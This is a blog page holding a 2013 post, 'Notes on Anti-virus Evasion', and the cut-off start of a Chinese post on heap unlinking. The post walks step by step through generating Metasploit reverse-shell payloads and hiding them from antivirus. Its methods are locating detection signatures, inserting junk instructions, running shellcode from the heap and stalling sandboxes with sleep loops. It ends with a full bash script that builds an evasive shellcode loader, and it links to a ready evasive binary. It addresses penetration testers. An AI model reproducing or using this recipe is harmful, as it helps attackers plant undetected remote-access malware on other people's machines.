<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Reverland的行知阁" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta property="og:type" content="website">
<meta property="og:title" content="Reverland的行知阁">
<meta property="og:url" content="http://reverland.org/page/10/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Reverland的行知阁">
<meta name="twitter:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-user fa-fw"></i> <br />
            
            关于
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
  <section id="posts" class="posts-expand">

    

    
    
      
      

      
    

    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2013/08/13/notes-on-anti-virus-evasion/" itemprop="url">
                  Notes on Anti-virus Evasion
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-08-13T00:00:00+08:00" content="2013-08-13">
              2013-08-13
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2013/08/13/notes-on-anti-virus-evasion/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2013/08/13/notes-on-anti-virus-evasion/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>Ok, This article is about why and how can you bypass antivirus softwares when you are using metasploit payloads. First of all, I’d like to emphasize the following things:</p>
<ol>
<li>Don’t be stupid. Do anything at your own risk.</li>
<li>There is nothing too hard to learn. If you find something really hard to understand. <a href="http://www.offensive-security.com/when-things-get-tough/" target="_blank" rel="external">Try harder</a>, you may lack of some necessary requirements, please refer to References section yourself. </li>
<li>There are lots of Unix tools to use for linux, so I use gentoo linux as my experiment environment. You can use anything you like.</li>
<li>I’m not a native English speaker, but I hope this article is interesting and useful to many non-Chinese speakers. So I write every word in a language I’m not familiar. The article may full with grammer mistakes, but you can understand what I’m saying is enough. Happy hacking.</li>
<li>Last but not least, Never upload your samples to a online scanner website like virustotal or so if you are a penetration tester and want to use your payload later. Check it on your local machine. you can alse try <a href="http://vscan.novirusthanks.org/" target="_blank" rel="external">novirusthanks</a> with <code>Do not distribute the sample</code> marked.</li>
</ol>
<h2 id="Theory:_How_Antivirus_software_works">Theory: How Antivirus software works</h2><h3 id="Signature-based_Detection">Signature-based Detection</h3><p>Why can you bypass AV detection? There won’t much way for AV vendors to decide whether a software is a normal program or a malware. They have 3 main ways, the most popular method it use to scan malwares is based on signature. AV engines scan the whole program to find something in accordance with the kown ‘bad strings’ in malwares. Once ‘bad strings’ being found, the program will be flagged as a malware.</p>
<p>You will soon see it is so. Lets take <a href="http://www.avast.com/" target="_blank" rel="external">Avast!</a> free edition as example. I do all my test on my linux machine, but you can do anything as you like.</p>
<p>First, Let’s use a <code>windows/meterpreter/reverse_tcp</code> payload from <a href="http://metasploit.com/" target="_blank" rel="external">Metasploit</a>. It will provide a reverse meterpreter shell to a remote computer for the hackers.</p>
<pre><code>~/metasploit-framework/msfpayload windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span> X &gt; payload.exe
</code></pre><p>Start a listenner and assert it really works</p>
<pre><code><span class="tag">wine</span> <span class="tag">payload</span><span class="class">.exe</span>
</code></pre><p>However, Avast! will find its a malware! Moreover, even when you open the file explorer, the payload will be found before any scan.</p>
<p>To my surprise, Avast! will flag the binary files(Non-execute files) as malwares too. So it look like it use some ‘signature’ to judge whether a program is malicious or not. But, what’s the signature?</p>
<p>To find out the ‘bad string’, I use the old bisection method to locate where the signature really is:</p>
<pre><code>~/metasploit-framework/msfpayload windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span> R &gt; payload_raw
cat payload_raw | cut -c614-<span class="number">663</span> &gt; malicious.txt
</code></pre><p>Ok, then I get the ‘bad string’ into <code>malicious.txt</code>. Scan it with Avast!, Avast! flag it as malware. You can download it <a href="https://github.com/reverland/scripts/blob/master/else/malicious.txt" target="_blank" rel="external">here</a> and test it with your own avast.</p>
<p>Now we are sure AV softwares use signature to find malwares. It is true, whenever a new suspicious files uploaded to AV vendors(for example, upload it to <a href="https://www.virustotal.com/" target="_blank" rel="external">Virustotal</a>), the new malware’s signature will be soon added to the virus signature database soon.</p>
<p>But thats not all.</p>
<p>There are other thing AV vendors use to detect malware. For metasploit is too famous in penetration testers’ group and other groups, AV softwares begin to detect whether the software is created with it. As a result, even if its not a malware, much AV will still flag your metasploit-created program as malware. You may check the <a href="http://www.intelligentexploit.com/articles/Metasploit:-Low-Level-View.pdf" target="_blank" rel="external">Metasploit: Low Level View</a> to learn more.</p>
<p>Seeing is believing. Let’s use metasploit framework to generate a program with no payload[^1]:</p>
<pre><code><span class="keyword">echo</span> -ne | ~/metasploit-framework/msfencode -<span class="keyword">e</span> generic/none -<span class="keyword">k</span> -<span class="keyword">x</span> calc.<span class="keyword">exe</span> -<span class="keyword">t</span> <span class="keyword">exe</span> -<span class="keyword">o</span> calc_no_payload.<span class="keyword">exe</span>
</code></pre><p>However, Avast! mark it as a threat <code>Win32 Rozpatch</code>, most AVs will detect it as malwares or simply virus as well, you can upload it to <a href="http://metascan-online.com/" target="_blank" rel="external">metascan</a> to check it.</p>
<p>What does that mean? You should use another way to generate programs if you won’t like your program to be detected.</p>
<p>In a word, Metasploit project are so well-known that nearly all it’s encoders and ways to generate programs are well researched. The encoder stub are simply to detect, the strange entrypoint to a rwx section are simply to detect. Much AVs are just detect these things rather than the real ‘bad signature’. Then we know we must use our own way to generate programs.</p>
<h3 id="Sandbox">Sandbox</h3><p>However, sandbox becomes more and more popular. Whenever a suspicious program runs, it will be comfined to a virtual sandbox environment. If they do something that can be flagged as malicious, the program will soon be marked as malware. Some AV will scan suspicious programs in this way. However, sandbox will take up too much system resources, it will only run it in sandbox for only little time than release it.</p>
<p>So malware authors begin to sleep or do some useless loops to pass the sandbox time. However, some AVs begin to flag program has the strange sleep and loops as malwares as a countermeasure.</p>
<p>The next example is to demonstrate this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">/* test for malwares */</span></span><br><span class="line"><span class="keyword">char</span> code[] = </span><br><span class="line"><span class="string">""</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">100</span>;j++)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"wait..."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>Then compile and link it.</p>
<pre><code>✘ ⮀ ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/bypassav ⮀ wine ~/</span>.wine<span class="regexp">/drive_c/</span>lcc<span class="regexp">/bin/</span>lcc test.c -o test.o
✘ ⮀ ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/bypassav ⮀ wine ~/</span>.wine<span class="regexp">/drive_c/</span>lcc<span class="regexp">/bin/</span>lcclnk.exe test.o -o test.exe
</code></pre><p>Then I upload it to metascan, 3 AVs mark it as malware though its nothing. The report is <a href="https://www.metascan-online.com/en/scanresult/file/bb96f4ab4ed74ae1b8766a6762b42470" target="_blank" rel="external">here</a></p>
<p>So you may have to use other ways to avoid these avs. Fortunately, there are tons of method to do this.(May not fortunate : ( )</p>
<h3 id="Heuristic">Heuristic</h3><p>When I try to bypass Kaspersky, It will always mark my deliberate payload with its heuristic engine. It’s really frustrating. You don’t know how heuristic works. At first I guess its something check special things like for-loop talked above in programs. So I remove my shellcode. It passed Kaspersky. I add my shellcode but not run it, it passed too. Then I noticed Kaspersky takes more time than other AVs to scan a sample. So I guess it may use a sandbox to check programs. However, when I use some sleep/for-loop tricks kaspersky will still mark my malware out. I check whether kaspersky will mark the sleep/for-loop section as malware, it didn’t.</p>
<p>So, that’s strange. How heuristic works? </p>
<p>After search on google, I find that kaspersky’s heuristic engine may check the windows api call of a program without running it. I remember <em>Metasploit: Low Level View</em> once said:</p>
<blockquote>
<p>Two effective methods are used to detect Polymorphic and Metamorphic</p>
<p>malware are :</p>
<p>− SAVE</p>
<p>on SAVE method a sequence of windows API calls are checked which<br>represent the signature of a malware. To decide whether a file is infected or<br>not; The ecludian distance between every API call is calculated. And if the<br>avg. of the API calls distances is less than 10% then a file is flagged as<br>infected. This implies on the (disk-level) injected code probably to be<br>detected</p>
<p>− Semantic aware</p>
<p>Here signatures are represented as control flow or tuples on instruction, on<br>disk-level a program is disassembled and a control flow is generated and<br>then compared to the signatures control flows and decided whether a<br>program is infected or not.</p>
</blockquote>
<p>No matter which method, you can simply disassemble metasploit’s payload and add some strange calls or jmps to confuse the heuristic engine. And I succeed fool Kaspersky just with a little simple <code>loop</code>:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    push ecx&#10;    add ecx,0x100&#10;    push eax&#10;xxx:&#10;    imul eax, 0x100&#10;    xor eax, eax&#10;    loop xxx</span><br></pre></td></tr></table></figure>
<p>The next section is my experiment and some scan report.</p>
<h2 id="Experiment_on_bypass_Antivirus_software">Experiment on bypass Antivirus software</h2><p>I want to bypass all av with metasploit generated payload. this is my program template to inject payload:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">/* shellprogram.c */</span></span><br><span class="line"><span class="keyword">char</span> code[] = </span><br><span class="line"><span class="string">"&lt;payload here&gt;"</span></span><br><span class="line"><span class="string">""</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> (*exeshell)();</span><br><span class="line">    exeshell = (<span class="keyword">int</span> (*)()) code;</span><br><span class="line">    (<span class="keyword">int</span>)(*exeshell)();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>To avoid the signature detection of the well-known metasploit payload, You can disassemble it and add random non-sense instructions(for example， push and pop) to make the binary different from the original one. You can simply write a script to automatic this like I do.[^2] Finally, get the new C style shellcode.</p>
<pre><code><span class="regexp">~/Work/</span>project<span class="regexp">/bypassav ⮀ ~/</span>metasploit-framework<span class="regexp">/msfpayload windows/</span>shell/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span> R &gt; shell_reverse_raw
<span class="regexp">~/Work/</span>project/bypassav ⮀ python ndisasm.py shell_reverse_raw &gt; ghost-writing.asm
<span class="regexp">~/Work/</span>project/bypassav ⮀ nasm ghost-writing.asm -o <span class="keyword">new</span>
<span class="regexp">~/Work/</span>project<span class="regexp">/bypassav ⮀ od -tx1 test.o | cut -c8-80 | sed -e 's/</span> <span class="regexp">/\\x/</span>g<span class="string">' | sed -e '</span>s<span class="regexp">/^/</span><span class="string">"/g' | sed -e 's/$/"</span>/g<span class="string">'</span>
</code></pre><p>Bypass all AVs’ detection is a challenge, for to avoid one AV you may trigger another one. The program above will bypass most but Asquared.</p>
<p>Why? I try to remove my shellcode just test the template, It will still be marked by avs. You can check the report <a href="http://vscan.novirusthanks.org/analysis/684ebdecaf29c41841833d9738c4ccac/Yy1ub25lLWV4ZQ==/" target="_blank" rel="external">here</a> and <a href="http://r.virscan.org/report/d35e77a1472bea0119ca8d1ec56d7b1a.html" target="_blank" rel="external">here</a></p>
<p>So it looks like execute from the data section is suspicious! There must many people use this tricks!</p>
<p>So I decided to copy it to heap and execute shellcode from heap.</p>
<p><a href="http://vscan.novirusthanks.org/analysis/312caba7ca97f0b0b6deee4e0ebb2b7a/Yy1zaGVsbC1yZXZlcnNlLW5hc20taGVhcC1ndy11/" target="_blank" rel="external">No shellcode and execute from heap</a>, No AV mark it as malicious. Another <a href="https://www.metascan-online.com/en/scanresult/file/dc5c7080fc44495f880facfdfc2b9eb1" target="_blank" rel="external">Report here</a></p>
<p>So, move your modified shellcode(You must Modified it so won’t be checked before execution) to heap and execute from heap. However, some AVs can detect it, here’s the <a href="https://www.metascan-online.com/en/scanresult/file/e3442be2dd0f4a089a2c16db2d387880" target="_blank" rel="external">report</a> and <a href="http://vscan.novirusthanks.org/analysis/312caba7ca97f0b0b6deee4e0ebb2b7a/Yy1zaGVsbC1yZXZlcnNlLW5hc20taGVhcC1ndy11/" target="_blank" rel="external">another one</a>.</p>
<p>make the modified upsidedown won’t bypass it and the name it marked never change. So I doubt these avs use sandbox to detect my shellcode.</p>
<p>So I add some sleep/for-loop to fool them. As mentioned earlier, you’d better try more find a slitely deferent way to fool them. It may work, but it may trigger other detection technichs.</p>
<p>After several tries and errors, I bypass all but Kaspersky. After several tries I know its not sandbox and signature. Then the story has been write earlier in this article.</p>
<p>The final bypass all report is <a href="https://www.metascan-online.com/en/scanresult/file/df3906541f8846f9a5ef38c7e31505e9" target="_blank" rel="external">here</a> You can download from <a href="https://github.com/reverland/scripts/blob/master/exe/hahaha.exe" target="_blank" rel="external">here</a> to check it(LHOST 192.168.56.102, windows/meterpreter/reverse_tcp, LPORT=4444, md5sum listed is in metascan)</p>
<p>Another thing to mention, I just upload it to virusnothanks when I did my experiments, for I don’t want to make the experiment uncerntainly. But now upload to anywhere is ok. If you want to do some experiments for several days, do not upload it to virustotal or metascan or viruscan and so on. You suspicious payload will be marked in one day.(Kaspersky really mark my payload in one day!)</p>
<p>I finally write scripts which generate random instructions for assemble language, encrypt or simply upsidedown shellcodes and automatic the whole process to facilitate my work. you can try one yourself. Similar to this one:</p>
<pre><code><span class="comment"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="shebang">#! /bin/env bash</span></span><br><span class="line">nasm -fbin <span class="string">"<span class="variable">$1</span>"</span> -o test.o</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; test.c &lt;&lt; EOF_FLAG</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;windows.h&gt;</span></span><br><span class="line">/* shellprogram.c */</span><br><span class="line">char code[] = </span><br><span class="line">EOF_FLAG</span><br><span class="line"></span><br><span class="line">LEN=`wc -c test.o| cut <span class="operator">-d</span><span class="string">' '</span> <span class="operator">-f</span>1`</span><br><span class="line">python upsidedown.py test.o</span><br><span class="line">od -tx1 test.o | cut -c8-<span class="number">80</span> | sed <span class="operator">-e</span> <span class="string">'s/ /\\x/g'</span> | sed <span class="operator">-e</span> <span class="string">'s/^/"/g'</span> | sed <span class="operator">-e</span> <span class="string">'s/$/"/g'</span> &gt;&gt; test.c</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"\"\";"</span> &gt;&gt; test.c</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; test.c &lt;&lt; EOF_FLAG</span><br><span class="line">int add(int);</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  int i, len, s;</span><br><span class="line">  char *p;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">EOF_FLAG</span><br><span class="line"></span><br><span class="line">str=<span class="string">'len = '</span><span class="variable">$&#123;LEN&#125;</span><span class="string">';'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str&#125;</span> &gt;&gt; test.c</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; test.c &lt;&lt; EOF_FLAG</span><br><span class="line">  p = (char *)malloc(len);</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">  s = add(i);</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      p[i] = code[len - <span class="number">1</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line">    int (*exeshell)();</span><br><span class="line">    exeshell = (int (*)()) p;</span><br><span class="line">    (int)(*exeshell)();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">int add(int num)</span><br><span class="line">&#123;</span><br><span class="line">static int sn;</span><br><span class="line">sn+=num;</span><br><span class="line"><span class="keyword">if</span>(num==<span class="number">10000</span>) <span class="built_in">return</span> sn;</span><br><span class="line">add(++num);</span><br><span class="line">&#125;</span><br><span class="line">EOF_FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment"># test.rc</span></span><br><span class="line">cat &gt;&gt; test.rc &lt;&lt; EOF_FLAG</span><br><span class="line"><span class="number">1</span> ICON <span class="string">"test.ico"</span></span><br><span class="line">EOF_FLAG</span><br><span class="line"></span><br><span class="line">wine ~/.wine/drive_c/lcc/bin/lcc.exe test.c -o test.obj</span><br><span class="line">wine ~/.wine/drive_c/lcc/bin/lrc.exe test.rc /otest.res</span><br><span class="line">wine ~/.wine/drive_c/lcc/bin/lcclnk.exe test.obj test.res -o test.exe</span><br><span class="line">i686-pc-mingw32-strip test.exe</span><br><span class="line"></span><br><span class="line">rm test.o</span><br><span class="line">rm test.rc</span><br><span class="line">rm test.obj</span><br><span class="line">rm test.res</span><br><span class="line">rm test.c</span><br><span class="line"><span class="comment">#rm test_encode.o</span></span><br><span class="line"><span class="comment">#wine test.exe</span></span><br><span class="line"><span class="comment">#rm test.exe</span></span><br></pre></td></tr></table></figure></span>
</code></pre><h2 id="Conclusion">Conclusion</h2><p>Theory about how AV detect are easy to understand and bypass, but AV vendors will also exert to detect malwares. Some may useful, some may outdated. These techs are sprayed among the Reference section, you can also google more. I don’t talk about it much. The world is changing quickly(especially for security), check it by yourselves.</p>
<p>Finally you will see, the most effective way to avoid any AV, however, is to write your own tools or use them your own way. All you need is just to be creative. </p>
<p>Last, I’ll recommend <a href="https://github.com/ChrisTruncer/Veil/" target="_blank" rel="external">Veil</a> to you. It’s really a amazing tool for penetration testers.</p>
<p>Lastly, Chinese: 英文作文真难写……</p>
<h2 id="Reference">Reference</h2><p>You can find more below and special thanks to them:</p>
<ul>
<li><a href="http://funoverip.net/2011/04/100pc-anti-virus-evasion-with-metasploit-browser-exploits-from-ms11-003/" target="_blank" rel="external">100% Anti-Virus evasion with Metasploit browser exploits(example with ms11-003)</a></li>
<li><a href="http://pen-testing.sans.org/blog/pen-testing/2013/07/12/anti-virus-evasion-a-peek-under-the-veil" target="_blank" rel="external">Anti-Virus Evasion: A Peek Under the Veil</a></li>
<li><a href="http://spareclockcycles.org/tag/antivirus-evasion/" target="_blank" rel="external">Avoiding AV Detection</a></li>
<li><a href="http://www.commonexploits.com/?p=789" target="_blank" rel="external">AV0id – Anti-Virus Bypass Metasploit Payload Generator Script</a></li>
<li><a href="http://www.abysssec.com/blog/2011/09/25/bypassing-all-anti-virus-in-the-world-good-bye-detection-hello-infection/" target="_blank" rel="external">bypassing all anti-virus in the world (Good Bye Detection , Hello Infection)</a></li>
<li><a href="http://carnal0wnage.attackresearch.com/2010/03/msfencode-msfpayload-into-existing.html" target="_blank" rel="external">Msfencode a Msfpayload Into An Existing Executable</a></li>
<li><a href="http://carnal0wnage.attackresearch.com/2011/07/process-injection-outside-of-metasploit.html" target="_blank" rel="external">Process Injection Outside of Metasploit</a></li>
<li><a href="http://pen-testing.sans.org/resources/papers/gcih/effectiveness-antivirus-detecting-metasploit-payloads-106563" target="_blank" rel="external">Effectiveness of Antivirus in Detecting Metasploit’s Payloads</a></li>
<li><a href="https://community.rapid7.com/community/metasploit/blog/2013/01/17/evading-anti-virus-detection--whiteboard-wednesday" target="_blank" rel="external">Evading Anti-Virus Detection - Whiteboard Wednesday</a></li>
<li><a href="http://schierlm.users.sourceforge.net/avevasion.html" target="_blank" rel="external">Facts and myths about antivirus evasion with Metasploit</a></li>
<li><a href="https://community.rapid7.com/community/metasploit/blog/2012/12/14/the-odd-couple-metasploit-and-antivirus-solutions" target="_blank" rel="external">The Odd Couple: Metasploit and Antivirus Solutions</a></li>
<li><a href="http://www.pentestgeek.com/2012/01/25/using-metasm-to-avoid-antivirus-detection-ghost-writing-asm/" target="_blank" rel="external">Using Metasm To Avoid Antivirus Detection (Ghost Writing ASM)</a></li>
<li><a href="http://pen-testing.sans.org/blog/2011/10/13/tips-for-evading-anti-virus-during-pen-testing" target="_blank" rel="external">Tips for Evading Anti-Virus During Pen Testing</a></li>
<li><a href="http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/" target="_blank" rel="external">Why Encoding Does not Matter and How Metasploit Generates EXE’s</a></li>
<li><a href="http://www.exploit-db.com/download_pdf/17968" target="_blank" rel="external">Evading Antimalware Engines via Assembly Ghostwriting</a></li>
<li><a href="http://blog.sina.com.cn/s/blog_63a4534c01012ugj.html" target="_blank" rel="external">分析卡巴斯基启发式扫描及其绕过方案(Chinese)</a></li>
</ul>
<h2 id="FootNotes">FootNotes</h2><p>[^1]: Example comes from <a href="http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/" target="_blank" rel="external">http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/</a><br>[^2]: Thanks to the article on <a href="http://www.pentestgeek.com/2012/01/25/using-metasm-to-avoid-antivirus-detection-ghost-writing-asm/#comment-513" target="_blank" rel="external">Pentest Geek</a>, however, nasm may a better choice. for there won’t be piles of <code>db</code>s</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2013/08/03/heap-unlinking/" itemprop="url">
                  堆溢出之Heap Unlinking
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2013-08-03T00:00:00+08:00" content="2013-08-03">
              2013-08-03
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2013/08/03/heap-unlinking/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2013/08/03/heap-unlinking/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <blockquote>
